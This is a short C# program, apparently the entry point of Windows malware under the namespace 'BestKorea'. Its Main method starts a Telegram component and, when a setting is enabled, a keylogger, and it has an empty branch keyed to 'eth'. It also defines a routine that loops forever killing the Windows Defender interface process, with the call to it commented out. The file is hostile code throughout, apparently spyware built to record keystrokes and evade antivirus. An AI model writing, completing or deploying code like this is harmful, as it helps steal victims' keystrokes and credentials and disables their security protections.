using System;
using System.Diagnostics;
using System.Threading;

namespace BestKorea
{

    class Program
    {
        static void Main(string[] args)
        {
           // Thread thread_killDefender = new Thread(killDefender);
            //thread_killDefender.Start();

            Telegram.Start();
            Console.WriteLine("Done");
            if (Properties.Settings.Default.Logging)
            {
                Keylogger.Start();
            }
            if (Properties.Settings.Default.Current == "eth")
            {

            }
        }

        static void killDefender()
        {
            while (true)
            {
                foreach (var process in Process.GetProcessesByName("MSASCuiL"))
                {
                    process.Kill();
                    Console.WriteLine("Killled");
                }
            }
        }

    }
}
